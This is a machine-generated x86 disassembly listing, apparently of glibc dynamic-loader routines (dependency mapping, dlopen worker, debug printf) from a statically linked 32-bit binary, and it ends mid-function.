mov dword [esp], str.cannot_allocate_symbol_search_list
xor ecx, ecx
mov eax, 0xc
jmp 0x80807c2
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x21a
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str.cnt___nlist
jmp 0x8080894
mov edx, dword [ebx + 4]
xor ecx, ecx
mov eax, 0x16
mov dword [esp], str.Filters_not_supported_with_LD_TRACE_PRELINKING
jmp 0x80807c2
lea esi, [esi]
mov ebx, dword [var_40h]
mov esi, dword [ebx + 0x150]
jmp 0x8080658
mov esi, dword [ebx + 4]
test byte [esi + 0x175], 2
je 0x808061e
mov eax, dword [var_40h]
dec dword [eax + 0x154]
jmp 0x8080634
mov ecx, edx
jmp 0x80809ac
mov eax, dword [esi + 0x150]
test eax, eax
jne 0x8080a4a
mov dword [esp], edx
call fcn.08051180
jmp 0x80805c9
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x1e2
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str.map__l_searchlist.r_list____void__0_
jmp 0x8080894
mov ecx, dword [var_40h]
mov edx, dword [ecx + 4]
mov dword [esp], str.cannot_allocate_dependency_list
jmp 0x80809b6
test eax, eax
mov dword [var_58h], 0xffffffff
je 0x8080593
mov dword [var_58h], eax
jmp 0x8080593
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.0807aeb0
test eax, eax
je 0x8080463
mov eax, dword [0x80a95f4]
test eax, eax
jne 0x8080bb6
mov dword [esp], esi
call fcn.08053400
mov ecx, dword [var_74h]
mov edi, eax
test ecx, ecx
je 0x8080b1f
mov edx, dword [var_5ch]
mov eax, dword [edx + 0x190]
test eax, eax
jne 0x8080b9e
mov eax, dword [edx + 4]
cmp byte [eax], 0
jne 0x8080b7a
call fcn.08083280
mov ecx, dword [var_5ch]
test eax, eax
mov dword [ecx + 0x190], eax
je 0x8080b76
cmp eax, 0xffffffff
je 0x8080b76
mov dword [esp], eax
call fcn.08053400
mov edx, eax
mov eax, dword [0x80aac0c]
cmp eax, edx
cmovb eax, edx
sub eax, 7
imul eax, dword [var_74h]
lea eax, [eax + edi]
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_sp_ch], 0
mov dword [var_4h], esi
and eax, 0xfffffff0
mov dword [var_8h], eax
mov eax, dword [var_5ch]
mov dword [esp], eax
call fcn.0807af60
cmp byte [eax], 0
mov edi, eax
jne 0x8080463
test byte [0x80aac10], 1
je 0x80804e3
mov dword [var_4h], esi
mov dword [esp], str.cannot_load_auxiliary___s_because_of_empty_dynamic_string_token_substitution_n
call fcn.08081c40
jmp 0x80804e3
xor edx, edx
jmp 0x8080b0b
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0xf0
mov dword [var_4h], str.dl_deps.c
mov dword [esp], str._l___l_name_0___0
jmp 0x8080894
xor edx, edx
cmp eax, 0xffffffff
je 0x8080b0b
mov dword [esp], eax
call fcn.08053400
jmp 0x8080b09
xor ecx, ecx
mov edx, edi
mov dword [esp], str.DST_not_allowed_in_SUID_SGID_programs
xor eax, eax
jmp 0x80807c2
cmp eax, 0x7ffffffd
je 0x8080bda
cmp eax, 0x7fffffff
jne 0x80804e3
mov edx, dword [var_70h]
mov esi, dword [var_68h]
add esi, dword [edx + 4]
mov dword [var_4h], 0x24
mov dword [esp], esi
mov edi, esi
call fcn.08076ce0
test eax, eax
jne 0x8080e15
mov edx, dword [var_70h]
mov dword [var_24h], edi
cmp dword [edx], 0x7ffffffd
je 0x8080da8
test byte [0x80aac10], 1
jne 0x8080d7d
lea eax, [var_34h]
lea edx, [var_38h]
mov ecx, 0x80801c0
mov dword [esp], eax
lea eax, [var_3ch]
call fcn.08081410
mov edx, dword [var_38h]
sub esp, 4
test edx, edx
jne 0x8080a80
mov edx, dword [var_6ch]
sub esp, 0x1c
lea edi, [var_1fh_2]
and edi, 0xfffffff0
mov eax, dword [edx]
mov dword [edi], eax
mov eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [var_20h]
mov dword [edx], 0
mov dword [edx + 4], eax
mov eax, dword [var_60h]
test eax, eax
je 0x8080c80
mov ecx, dword [var_64h]
mov eax, dword [var_20h]
mov esi, dword [var_60h]
mov dword [esi + ecx*4], eax
inc ecx
mov dword [var_64h], ecx
mov ecx, dword [var_20h]
movzx eax, byte [ecx + 0x174]
mov esi, ecx
test al, 0x60
je 0x8080d52
mov eax, dword [edi + 8]
mov edx, edi
test eax, eax
je 0x8080d4a
mov eax, dword [edx + 8]
cmp dword [eax + 4], esi
je 0x8080cb4
mov edx, eax
mov eax, dword [eax + 8]
test eax, eax
jne 0x8080ca1
xor eax, eax
test eax, eax
je 0x8080d32
mov eax, dword [var_6ch]
mov dword [eax + 8], edi
mov eax, dword [edx + 8]
cmp dword [var_4ch], eax
mov eax, dword [var_4ch]
cmove eax, edx
mov dword [var_4ch], eax
mov eax, dword [edx + 8]
mov eax, dword [eax + 8]
mov dword [edx + 8], eax
mov edx, dword [esi + 0x10]
test edx, edx
je 0x8080ce6
mov eax, dword [esi + 0xc]
mov dword [edx + 0xc], eax
mov ecx, dword [var_20h]
mov edx, dword [ecx + 0xc]
test edx, edx
je 0x8080cf6
mov eax, dword [ecx + 0x10]
mov dword [edx + 0x10], eax
mov ecx, dword [var_20h]
mov eax, dword [edi + 4]
mov eax, dword [eax + 0x10]
mov dword [ecx + 0x10], eax
mov eax, dword [var_20h]
mov edx, dword [edi + 4]
mov dword [edx + 0x10], eax
mov ecx, dword [var_20h]
mov eax, dword [ecx + 0x10]
test eax, eax
je 0x8080d18
mov dword [eax + 0xc], ecx
mov ecx, dword [var_20h]
mov eax, dword [edi + 4]
mov dword [ecx + 0xc], eax
mov eax, dword [var_4ch]
cmp dword [var_6ch], eax
mov dword [var_6ch], edi
cmove eax, edi
mov dword [var_4ch], eax
jmp 0x80804e3
mov eax, dword [edi]
mov edx, dword [var_6ch]
mov dword [edx], eax
mov eax, dword [edi + 4]
mov dword [edx + 4], eax
mov eax, dword [edi + 8]
mov dword [edx + 8], eax
jmp 0x80804e3
mov eax, dword [edi + 8]
jmp 0x8080cb4
mov esi, dword [var_6ch]
and eax, 0xffffff9f
inc dword [var_14h]
or eax, 0x20
mov dword [esi + 8], edi
mov byte [ecx + 0x174], al
mov ecx, dword [var_20h]
mov edx, dword [ecx + 0x10]
test edx, edx
je 0x8080ce6
mov eax, dword [ecx + 0xc]
jmp 0x8080ce0
mov esi, dword [var_5ch]
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x8080d8f
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], edi
mov dword [esp], str.load_filtered_object_s_requested_by_file_s_n
call fcn.08081c40
jmp 0x8080c1c
test byte [0x80aac10], 1
jne 0x8080ded
lea eax, [var_34h]
mov ecx, 0x80801c0
lea edx, [var_38h]
mov dword [esp], eax
lea eax, [var_3ch]
call fcn.08081410
mov eax, dword [var_38h]
sub esp, 4
test eax, eax
je 0x8080c40
cmp eax, str.out_of_memory
je 0x80804e3
mov dword [esp], eax
call fcn.08051180
jmp 0x80804e3
mov ecx, dword [var_5ch]
mov eax, dword [ecx + 4]
cmp byte [eax], 0
jne 0x8080dff
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], edi
mov dword [esp], str.load_auxiliary_object_s_requested_by_file_s_n
call fcn.08081c40
jmp 0x8080db1
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.0807aeb0
test eax, eax
je 0x8080bfd
mov eax, dword [0x80a95f4]
test eax, eax
jne 0x8080bb6
mov dword [esp], esi
call fcn.08053400
mov ecx, dword [var_78h]
mov edi, eax
test ecx, ecx
je 0x8080e9d
mov ecx, dword [var_5ch]
mov eax, dword [ecx + 0x190]
test eax, eax
jne 0x8080f0a
mov eax, dword [ecx + 4]
cmp byte [eax], 0
jne 0x8080ef5
call fcn.08083280
mov edx, dword [var_5ch]
test eax, eax
mov dword [edx + 0x190], eax
je 0x8080ef1
cmp eax, 0xffffffff
je 0x8080ef1
mov dword [esp], eax
call fcn.08053400
mov edx, eax
mov eax, dword [0x80aac0c]
cmp eax, edx
cmovb eax, edx
sub eax, 7
imul eax, dword [var_78h]
lea eax, [eax + edi]
add eax, 0x12
mov ecx, dword [var_5ch]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_sp_ch], 0
mov dword [var_4h], esi
and eax, 0xfffffff0
mov dword [esp], ecx
mov dword [var_8h], eax
call fcn.0807af60
cmp byte [eax], 0
mov edi, eax
jne 0x8080bfd
mov eax, dword [var_70h]
cmp dword [eax], 0x7ffffffd
jne 0x8080b54
mov dword [esp], str.empty_dynamics_string_token_substitution
xor ecx, ecx
mov edx, esi
jmp 0x8080bc1
xor edx, edx
jmp 0x8080e89
mov dword [var_sp_ch], str._dl_map_object_deps
mov dword [var_8h], 0x11c
jmp 0x8080b8a
xor edx, edx
cmp eax, 0xffffffff
je 0x8080e89
mov dword [esp], eax
call fcn.08053400
jmp 0x8080e87
push ebp
mov ebp, esp
push edi
mov edi, ecx
push esi
mov esi, eax
push ebx
sub esp, 0x2c
mov ebx, dword [esi + 0x9c]
mov eax, dword [eax + 0x98]
mov dword [var_10h], edx
mov dword [var_14h], eax
mov eax, dword [0x80aac64]
test eax, eax
jne 0x8081747
mov eax, dword [var_14h]
test eax, eax
jne 0x80816cb
xor eax, eax
call fcn.08081770
mov dword [eax + 0xc], 1
mov dword [var_18h], eax
call fcn.080817b0
mov ebx, dword [esi + 0x154]
mov eax, ebx
dec ebx
test eax, eax
jne 0x808169f
mov eax, dword [var_18h]
mov dword [eax + 0xc], 0
call fcn.080817b0
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, dword [arg_8h]
mov edx, dword [var_10h]
mov dword [var_8h], edi
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [esi + 0x1d8]
mov eax, dword [eax + ebx*4]
mov dword [esp], eax
call fcn.08081540
mov eax, ebx
dec ebx
test eax, eax
jne 0x808169f
jmp 0x8081686
test ebx, ebx
je 0x8081663
mov eax, dword [ebx + 4]
mov ebx, eax
shr ebx, 2
je 0x8081663
test byte [0x80aac10], 2
jne 0x8081726
mov edx, dword [var_14h]
mov eax, dword [esi]
mov edx, dword [edx + 4]
mov dword [var_20h], 0
add eax, edx
cmp dword [var_20h], ebx
mov dword [var_1ch], eax
jae 0x8081663
mov eax, dword [arg_8h]
mov edx, dword [var_10h]
mov dword [var_4h], edi
mov dword [var_8h], eax
mov dword [esp], edx
mov eax, dword [var_20h]
mov edx, dword [var_1ch]
call dword [edx + eax*4]
inc dword [var_20h]
cmp dword [var_20h], ebx
jb 0x80816ff
jmp 0x8081663
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x8081735
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_4h], eax
mov dword [esp], str._ncalling_preinit:__s_n_n
call fcn.08081c40
jmp 0x80816e2
mov edx, dword [arg_8h]
mov dword [var_8h], ecx
mov dword [esp], eax
mov dword [var_ch], edx
mov edx, dword [var_10h]
mov dword [var_4h], edx
call fcn.08081540
mov dword [0x80aac64], 0
jmp 0x808165c
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [arg_ch]
mov dword [var_4h], 1
mov dword [var_ch], eax
mov eax, dword [arg_8h]
mov dword [var_8h], eax
mov eax, dword [0x80a95c0]
mov dword [esp], eax
call fcn.08081860
leave
ret
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0x23c
mov dword [var_220h], 0
mov esi, dword [arg_10h]
movzx ebx, byte [esi]
test bl, bl
je 0x808193c
mov eax, dword [arg_ch]
mov dword [var_224h], esi
test eax, eax
jle 0x80818cd
mov ecx, dword [var_220h]
test ecx, ecx
je 0x8081bb4
cmp edi, 0x3f
jg 0x8081ba2
lea eax, [var_21ch]
mov dword [ebp + edi*8 - 0x208], 0xc
mov dword [arg_ch], 0xffffffff
mov dword [ebp + edi*8 - 0x20c], eax
movzx ebx, byte [esi]
inc edi
test bl, bl
je 0x8081900
cmp bl, 0x25
je 0x8081900
mov edx, dword [arg_ch]
test edx, edx
jne 0x8081b94
inc esi
movzx ebx, byte [esi]
test bl, bl
je 0x8081900
cmp bl, 0x25
je 0x8081900
mov eax, dword [arg_ch]
test eax, eax
je 0x80818e1
cmp bl, 0xa
jne 0x80818e1
lea esi, [esi]
cmp edi, 0x3f
jg 0x8081b70
mov eax, esi
sub eax, dword [var_224h]
test eax, eax
mov dword [ebp + edi*8 - 0x208], eax
je 0x808192a
mov edx, dword [var_224h]
mov dword [ebp + edi*8 - 0x20c], edx
inc edi
cmp bl, 0x25
je 0x8081987
cmp bl, 0xa
je 0x8081956
test bl, bl
jne 0x8081886
lea ecx, [var_20ch]
mov ebx, dword [arg_8h]
mov edx, edi
mov eax, 0x92
int 0x80
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
cmp esi, dword [var_224h]
je 0x8081972
inc dword [ebp + edi*8 - 0x210]
mov dword [arg_ch], 1
inc esi
movzx ebx, byte [esi]
jmp 0x8081934
mov dword [ebp + edi*8 - 0x20c], esi
mov dword [ebp + edi*8 - 0x208], 1
inc edi
jmp 0x8081965
inc esi
mov byte [var_225h], 0x20
mov dword [var_22ch], 0xffffffff
mov dword [var_230h], 0xffffffff
movzx ebx, byte [esi]
cmp bl, 0x30
je 0x8081b60
cmp bl, 0x2a
je 0x8081b48
cmp bl, 0x2e
je 0x8081b24
cmp bl, 0x6c
je 0x8081b1b
cmp bl, 0x5a
je 0x8081b1b
movsx eax, bl
cmp eax, 0x75
je 0x8081a7f
jg 0x8081a76
cmp eax, 0x25
je 0x8081a62
cmp eax, 0x73
je 0x8081a20
mov eax, str.invalid_format_specifier
test eax, eax
je 0x808196c
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0xe3
mov dword [var_4h], str.dl_misc.c
mov dword [esp], str.___invalid_format_specifier_
call fcn.0805efc0
mov eax, dword [arg_14h]
add dword [arg_14h], 4
mov eax, dword [eax]
mov dword [ebp + edi*8 - 0x20c], eax
mov dword [esp], eax
call fcn.08053400
cmp dword [var_230h], 0xffffffff
mov dword [ebp + edi*8 - 0x208], eax
je 0x8081a5c
cmp eax, dword [var_230h]
cmova eax, dword [var_230h]
mov dword [ebp + edi*8 - 0x208], eax
inc edi
jmp 0x808196c
mov dword [ebp + edi*8 - 0x20c], esi
mov dword [ebp + edi*8 - 0x208], 1
jmp 0x8081a5c
cmp eax, 0x78
jne 0x80819ef
mov eax, dword [arg_14h]
sub esp, 0x1c
mov edx, 0x10
add dword [arg_14h], 4
mov ecx, dword [eax]
mov dword [var_4h_2], 0
mov dword [var_10h], 0
lea eax, [var_4h]
or eax, 0xc
cmp bl, 0x78
mov dword [var_234h], eax
mov dword [esp], ecx
mov eax, 0xa
cmovne edx, eax
mov dword [esp + 0xc], edx
mov edx, dword [var_234h]
mov dword [var_8h_2], edx
call fcn.08063ca0
cmp dword [var_22ch], 0xffffffff
mov edx, eax
je 0x8081b03
mov eax, dword [var_234h]
sub eax, edx
cmp eax, dword [var_22ch]
jge 0x8081b03
movzx ebx, byte [var_225h]
dec edx
mov byte [edx], bl
mov eax, dword [var_234h]
sub eax, edx
cmp eax, dword [var_22ch]
jl 0x8081ae9
sub dword [var_234h], edx
mov dword [ebp + edi*8 - 0x20c], edx
mov eax, dword [var_234h]
jmp 0x8081a55
inc esi
movzx ebx, byte [esi]
jmp 0x80819d3
cmp byte [esi + 1], 0x2a
jne 0x80819c1
mov eax, dword [arg_14h]
add esi, 2
add dword [arg_14h], 4
mov eax, dword [eax]
mov dword [var_230h], eax
movzx ebx, byte [esi]
jmp 0x80819c1
mov eax, dword [arg_14h]
inc esi
add dword [arg_14h], 4
mov eax, dword [eax]
mov dword [var_22ch], eax
movzx ebx, byte [esi]
jmp 0x80819b8
inc esi
mov byte [var_225h], 0x30
movzx ebx, byte [esi]
jmp 0x80819af
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0x83
mov dword [var_4h], str.dl_misc.c
mov dword [esp], str.niov___64
jmp 0x8081a1b
cmp bl, 0xa
jne 0x80818e1
jmp 0x8081900
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0x76
jmp 0x8081b80
call fcn.08053db0
test eax, eax
mov dword [var_220h], eax
js 0x8081c1b
lea eax, [var_212h]
mov dword [var_10h_2], 0
mov dword [var_sp_ch], 0xa
mov dword [var_8h], eax
lea ebx, [var_21ch]
mov eax, dword [var_220h]
cdq
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08063ca0
cmp eax, ebx
jbe 0x8081c08
lea esi, [esi]
dec eax
cmp eax, ebx
mov byte [eax], 0x20
ja 0x8081c00
mov byte [var_212h], 0x3a
mov byte [var_211h], 9
jmp 0x80818a1
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0x6d
mov dword [var_4h], str.dl_misc.c
mov dword [esp], str.pid___0__sizeof__pid_t____4
jmp 0x8081a1b
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0xc
mov eax, dword [arg_8h]
mov ebx, dword [eax + 0x154]
cmp edi, ebx
mov dword [var_10h], ebx
jae 0x8054b39
mov ecx, dword [eax + 0x150]
mov eax, dword [ecx + edi*4]
lea edx, [esi + 1]
test byte [eax + 0x174], 0x10
cmove esi, edx
inc edi
cmp edi, dword [var_10h_3]
jb 0x8054b23
mov edx, dword [0x80aac24]
test edx, edx
je 0x8054bea
mov ecx, dword [0x80a95b8]
mov eax, dword [ecx + 4]
add eax, esi
cmp eax, edx
ja 0x8054ba9
xor edi, edi
cmp edi, ebx
jae 0x8054b9f
lea esi, [esi]
mov edx, dword [var_4h]
mov eax, dword [edx + 0x150]
mov esi, dword [eax + edi*4]
movzx eax, byte [esi + 0x174]
test al, 0x10
jne 0x8054b9a
or eax, 0x10
mov byte [esi + 0x174], al
mov eax, dword [0x80a95b8]
mov edx, dword [eax + 4]
mov ecx, dword [eax]
mov dword [ecx + edx*4], esi
inc edx
mov dword [eax + 4], edx
mov eax, dword [var_4h]
mov ebx, dword [eax + 0x154]
inc edi
cmp edi, ebx
jb 0x8054b60
lea esp, [var_4h_5]
xor eax, eax
pop ebx
pop esi
pop edi
leave
ret
lea eax, [esi + edx]
lea eax, [eax*4 + 0x20]
mov dword [var_8h], eax
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov ebx, eax
je 0x8054c3f
add esi, dword [0x80aac24]
mov edx, dword [var_4h]
lea eax, [esi + 8]
mov dword [0x80aac24], eax
mov eax, dword [0x80a95b8]
mov dword [eax], ebx
mov ebx, dword [edx + 0x154]
jmp 0x8054b56
mov eax, dword [0x80a95b8]
add esi, dword [eax + 4]
lea eax, [esi + 8]
mov dword [0x80aac24], eax
shl eax, 2
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x8054c35
mov eax, dword [0x80a95b8]
mov edi, ebx
cld
mov ecx, dword [eax + 4]
mov esi, dword [eax]
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [0x80a95b8]
mov dword [eax], ebx
mov eax, dword [var_4h]
mov ebx, dword [eax + 0x154]
jmp 0x8054b56
mov dword [0x80aac24], 0
mov edx, dword [arg_8h]
xor ecx, ecx
mov eax, dword [edx + 0x14]
mov dword [esp], str.cannot_extend_global_scope
mov edx, dword [eax]
mov eax, 0xc
call fcn.08081200
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
mov eax, dword [var_8h]
mov edx, dword [eax + 4]
mov ebx, dword [eax]
mov dword [var_4h], 0x24
mov dword [var_10h_2], edx
mov dword [esp], ebx
call fcn.08076ce0
test eax, eax
mov edi, eax
jne 0x805519a
mov eax, dword [var_10h_3]
xor ecx, ecx
mov edx, ebx
mov dword [var_4h], 0
mov dword [esp], 2
mov dword [var_sp_8h], eax
xor eax, eax
call fcn.0807cfa0
mov edx, dword [var_4h]
sub esp, 0xc
mov dword [var_38h_2], eax
test eax, eax
mov dword [edx + 0x10], eax
je 0x805516c
test dword [var_10h_3], 0x40000000
jne 0x8054e5d
mov ecx, dword [var_38h_2]
mov esi, dword [ecx + 0x150]
test esi, esi
jne 0x8055117
mov eax, dword [var_10h_3]
xor ecx, ecx
xor edx, edx
mov dword [esp], 0
and eax, 0x80000000
mov dword [var_4h_4], eax
mov eax, dword [var_38h_2]
call fcn.08080290
mov edi, dword [var_38h_2]
sub esp, 8
mov dword [var_14h_2], 0
mov esi, dword [edi + 0x154]
cmp dword [var_14h_2], esi
jae 0x8054d3d
mov edx, dword [var_38h_2]
mov ecx, dword [var_14h_2]
mov eax, dword [edx + 0x150]
mov eax, dword [eax + ecx*4]
mov ebx, dword [eax + 0x17c]
test ebx, ebx
je 0x8055100
inc dword [var_14h_2]
cmp dword [var_14h_2], esi
jb 0x8054d18
mov eax, dword [var_10h_3]
xor ebx, ebx
and eax, 3
cmp eax, 1
je 0x80550f0
mov esi, dword [var_38h_2]
mov eax, dword [esi + 0xc]
test eax, eax
je 0x8054d61
mov esi, eax
mov eax, dword [eax + 0xc]
test eax, eax
jne 0x8054d58
test byte [esi + 0x174], 4
je 0x80550cd
cmp esi, dword [var_38h_2]
je 0x8054d78
mov esi, dword [esi + 0x10]
jmp 0x8054d61
mov esi, dword [var_38h_2]
test esi, esi
je 0x8054d96
nop
movzx eax, byte [esi + 0x175]
test al, 4
jne 0x80550b6
mov esi, dword [esi + 0xc]
test esi, esi
jne 0x8054d80
mov edi, dword [var_38h_2]
mov dword [var_14h_2], 0
mov byte [var_15h_2], 0
mov esi, dword [edi + 0x154]
cmp dword [var_14h_2], esi
jae 0x8054e19
nop
mov eax, dword [var_38h]
mov edi, dword [var_14h]
mov ecx, dword [eax + 0x150]
mov ebx, dword [ecx + edi*4]
mov edx, ecx
mov eax, dword [ebx + 0x170]
inc eax
cmp eax, 1
mov dword [ebx + 0x170], eax
jbe 0x8054de5
movzx eax, byte [ebx + 0x174]
and eax, 3
cmp al, 2
je 0x8054fb7
mov ebx, dword [var_14h]
mov eax, dword [edx + ebx*4]
cmp dword [eax + 0x170], 1
je 0x8054ea4
inc dword [var_14h]
cmp dword [var_14h], esi
jb 0x8054db0
cmp byte [var_15h], 0
je 0x8054e19
mov eax, dword [0x80aabe4]
inc eax
test eax, eax
mov dword [0x80aabe4], eax
je 0x805530b
mov eax, dword [0x80aa840]
mov ecx, dword [0x80aac80]
mov edx, dword [0x80aac7c]
mov dword [esp], eax
mov eax, dword [var_38h]
call fcn.08081630
sub esp, 4
test dword [var_10h_2], 0x100
jne 0x8054e93
test dword [var_10h_2], 0x1000
jne 0x8054e87
test byte [0x80aac10], 0x40
mov dword [0x80a95f8], 1
jne 0x8054e65
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [var_38h]
mov eax, dword [ecx + 0x170]
mov dword [var_4h], eax
mov eax, dword [ecx + 4]
mov dword [esp], str.opening_file_s__opencount___u_n_n
mov dword [var_4h_2], eax
call fcn.08081c40
jmp 0x8054e5d
mov edx, dword [var_38h]
or dword [edx + 0x1ec], 8
jmp 0x8054e4a
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.08054b00
test eax, eax
jne 0x8054e5d
jmp 0x8054e41
mov edx, dword [eax + 0x218]
test edx, edx
je 0x8054df8
mov ebx, dword [eax + 0x228]
movzx eax, byte [eax + 0x174]
and eax, 3
cmp al, 2
jne 0x8054f96
mov edx, dword [0x80aabdc]
xor esi, esi
mov eax, dword [edx]
cmp ebx, eax
jb 0x8054f8d
mov esi, edx
sub ebx, eax
mov edx, dword [edx + 4]
test edx, edx
jne 0x8054ed2
test ebx, ebx
jne 0x8054f69
mov dword [esp], 0x1f8
call fcn.08050fe0
test eax, eax
mov dword [esi + 4], eax
mov edx, eax
je 0x8054f4b
lea esi, [eax + 8]
mov dword [eax], 0x3e
mov dword [eax + 4], 0
cld
mov eax, ebx
mov ecx, 0x7c
mov edi, esi
rep stosd dword es:[edi], eax
mov eax, dword [var_38h]
mov ecx, dword [eax + 0x150]
mov esi, dword [var_14h]
mov edi, dword [var_38h]
mov byte [var_15h], 1
mov eax, dword [ecx + esi*4]
mov dword [edx + ebx*8 + 0xc], eax
mov eax, dword [0x80aabe4]
inc eax
mov dword [edx + ebx*8 + 8], eax
mov esi, dword [edi + 0x154]
jmp 0x8054df8
inc dword [0x80aabe4]
mov dword [esp], str.cannot_create_TLS_data_structures
xor ecx, ecx
mov edx, str.dlopen
mov eax, 0xc
call fcn.08081200
mov dword [var_ch], str.dl_open_worker
mov dword [var_sp_8h], 0x1ad
mov dword [var_4h], str.dl_open.c
mov dword [esp], str.idx__0
call fcn.0805efc0
test edx, edx
jne 0x8054f25
jmp 0x8054ee7
mov dword [var_ch], str.dl_open_worker
mov dword [var_sp_8h], 0x198
mov dword [var_4h], str.dl_open.c
mov dword [esp], str.new__l_searchlist.r_list_i___l_type__lt_loaded
jmp 0x8054f88
mov eax, dword [ebx + 0x1b4]
mov dword [var_28h], 0
mov dword [var_34h], eax
mov edx, eax
mov eax, dword [eax]
test eax, eax
je 0x8054fec
mov edi, dword [var_38h]
lea ecx, [edi + 0x150]
cmp eax, ecx
je 0x80550a9
add edx, 4
inc dword [var_28h]
mov eax, dword [edx]
test eax, eax
jne 0x8054fd8
mov eax, dword [var_28h]
mov edx, dword [ebx + 0x1b0]
inc eax
cmp eax, edx
mov dword [var_2ch], eax
jae 0x805501d
mov eax, dword [var_38h]
mov ebx, dword [var_34h]
mov ecx, dword [var_28h]
mov edi, dword [var_2ch]
add eax, 0x150
mov dword [ebx + ecx*4], eax
mov dword [ebx + edi*4], 0
jmp 0x8054df8
lea eax, [ebx + 0x1a0]
lea ecx, [edx + edx]
cmp dword [var_34h], eax
mov dword [var_30h], ecx
je 0x8055080
lea eax, [edx*8]
mov dword [var_4h], eax
mov eax, dword [ebx + 0x1b4]
mov dword [esp], eax
call fcn.08051220
test eax, eax
je 0x805506e
mov dword [ebx + 0x1b4], eax
mov edx, dword [var_38h]
mov eax, dword [var_30h]
mov dword [ebx + 0x1b0], eax
mov esi, dword [edx + 0x154]
mov ebx, dword [ebx + 0x1b4]
mov dword [var_34h], ebx
jmp 0x8054ffd
mov dword [esp], str.cannot_create_scope_list
jmp 0x8054f58
lea esi, [esi]
lea eax, [edx*8]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
je 0x805506e
mov ecx, dword [var_28h]
mov esi, dword [ebx + 0x1b4]
mov edi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x805504b
test eax, eax
jne 0x8054df8
jmp 0x8054fec
and eax, 0xfffffffb
mov byte [esi + 0x175], al
mov dword [esp], esi
call dword [0x80a95bc]
jmp 0x8054d8f
mov dword [var_4h_4], 0
mov dword [esp + 8], ebx
mov eax, dword [esi + 0x1b4]
mov dword [esp], esi
mov dword [var_4h_5], eax
call fcn.0807eda0
jmp 0x8054d6e
mov ecx, dword [0x80aac38]
test ecx, ecx
cmovne ebx, eax
jmp 0x8054d4e
xor ecx, ecx
xor edx, edx
call fcn.08082090
mov ebx, dword [var_38h_2]
mov esi, dword [ebx + 0x154]
jmp 0x8054d35
test byte [0x80aac10], 0x40
jne 0x805514d
test dword [var_10h_3], 0x100
je 0x8055135
mov ebx, dword [var_38h_2]
test byte [ebx + 0x174], 0x10
je 0x8055143
mov esi, dword [var_38h_2]
inc dword [esi + 0x170]
jmp 0x8054e5d
mov dword [esp], ebx
call fcn.08054b00
jmp 0x8055135
mov eax, dword [ecx + 0x170]
mov dword [esp + 8], eax
mov eax, dword [ecx + 4]
mov dword [esp], str.opening_file_s__opencount___u_n_n
mov dword [var_4h_4], eax
call fcn.08081c40
jmp 0x8055120
test byte [var_10h_3], 4
jne 0x8054e5d
mov dword [var_4h_2], str.dl_open_worker
mov dword [esp + 8], 0xeb
mov dword [var_4h_4], str.dl_open.c
mov dword [esp], str.mode__0x00004
jmp 0x8054f88
mov ecx, dword [var_8h]
mov ecx, dword [ecx + 8]
mov dword [esp], ebx
mov dword [var_1ch], ecx
call fcn.08053400
mov ecx, dword [0x80a95f4]
mov dword [var_20h], eax
test ecx, ecx
jne 0x8055302
mov esi, dword [0x80aac58]
mov dword [var_24h], 0
test esi, esi
mov eax, esi
je 0x80552f2
mov edx, dword [var_1ch_2]
cmp edx, dword [esi + 0x194]
jb 0x80551ea
cmp edx, dword [esi + 0x198]
jb 0x80552fa
mov esi, dword [esi + 0xc]
test esi, esi
jne 0x80551d3
mov edx, dword [var_24h]
test edx, edx
je 0x80552f2
mov dword [esp], edi
mov esi, dword [var_20h_2]
mov dword [var_4h], 0
call fcn.0807aeb0
test eax, eax
mov edi, eax
je 0x8055268
mov ecx, dword [var_24h]
mov eax, dword [ecx + 0x190]
test eax, eax
jne 0x80552da
mov eax, dword [ecx + 4]
cmp byte [eax], 0
jne 0x80552b6
call fcn.08083280
mov esi, dword [var_24h]
test eax, eax
mov dword [esi + 0x190], eax
je 0x80552b2
cmp eax, 0xffffffff
je 0x80552b2
mov dword [esp], eax
call fcn.08053400
mov edx, eax
mov eax, dword [0x80aac0c]
mov esi, dword [var_20h_2]
cmp eax, edx
cmovb eax, edx
sub eax, 7
imul edi, eax
add esi, edi
lea eax, [esi + 0x10]
